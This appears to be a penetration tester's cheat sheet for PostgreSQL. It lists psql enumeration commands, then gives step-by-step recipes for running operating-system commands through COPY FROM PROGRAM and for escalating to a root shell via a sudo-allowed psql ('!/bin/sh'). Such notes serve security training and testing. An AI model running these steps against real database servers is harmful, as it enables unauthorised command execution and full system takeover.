> A terminal-based front-end to PostgreSQL. It enables you to type in queries interactively, issue them to PostgreSQL, and see the query results. Alternatively, input can be from a file or from command line arguments.


#SQL #PSQL

Connecting to the PostgreSQL service 
```psql
psql -h 192.168.69.169 -p 2345 -U postgres
```

List version
```psql
SELECT version();
```

List all user accounts (or roles) in the current PostgreSQL database server
```psql
\du
```

Listing databases using psql
```psql
\l
```

Connect to database
```psql
\c somedatabase
```

Show all tables in the current schema
```psql
\dt
```

Query the _user_ table
```psql
SELECT * from user;
```

# Possible Exploits

## Command Execution

- [ ] Connect to postgres database
```psql
\c postgres
```

- [ ] Drop the table you want to use if it already exists
```psql
DROP TABLE IF EXISTS cmd_exec;
```

- [ ] Create the table you want to hold the command output
```psql
CREATE TABLE cmd_exec(cmd_output text);
```

- [ ] Run the system command via the COPY FROM PROGRAM function
```psql
COPY cmd_exec FROM PROGRAM 'id';
```

- [ ] View the results (Optional)
```psql
SELECT * FROM cmd_exec;
```

- [ ] Clean up
```psql
DROP TABLE IF EXISTS cmd_exec;
```

#Linux_Privilege_Escalation 
## sudo

> If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- [ ] Access PostgreSQL
```
psql
```

- [ ] Create "root" role
```
CREATE ROLE root SUPERUSER;
```
- Fixes `psql: error: FATAL:  role "root" does not exist` when using `sudo psql`

- [ ] Give the role permission to log in
```
ALTER ROLE "root" WITH LOGIN;
```
- Fixes `psql: error: FATAL:  role "root" is not permitted to log in` when using `sudo psql`

- [ ] Run psql as sudo by specifying database to login, or;
```
psql -U root -d postgres
```
- Fixes `psql: error: FATAL:  database "root" does not exist` when using `sudo psql`

- [ ] Run psql as sudo by creating a database named "root"
```
CREATE DATABASE root;
```
- Fixes `psql: error: FATAL:  database "root" does not exist` when using `sudo psql`

- [ ] Get shell while maintaining elevated privileges
```
\?
!/bin/sh
```